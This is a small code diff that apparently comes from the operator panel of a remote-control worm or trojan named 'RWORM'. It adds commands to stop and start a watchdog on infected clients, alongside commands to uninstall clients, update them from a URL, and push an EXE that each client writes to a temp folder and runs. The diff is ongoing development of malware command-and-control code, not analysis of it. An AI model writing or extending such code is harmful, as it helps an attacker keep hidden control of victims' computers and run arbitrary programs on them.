@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
@@ -172,6 +172,10 @@ namespace RWORM.GUI.Services
         public Task ClientUninstall(string guid) => GuiSend(0xA1, guid, Array.Empty<byte>());
         public Task ClientUpdate(string guid, string url)
             => GuiSend(0xA2, guid, Encoding.UTF8.GetBytes(url));
+        public Task WatchdogStop(string guid)
+            => GuiSend(0xA5, guid, Array.Empty<byte>());
+        public Task WatchdogStart(string guid)
+            => GuiSend(0xA6, guid, Array.Empty<byte>());
 
         // ── Tasks ─────────────────────────────────────────────────────────────
         /// Send raw EXE bytes → client writes to temp → exec (0xB0).
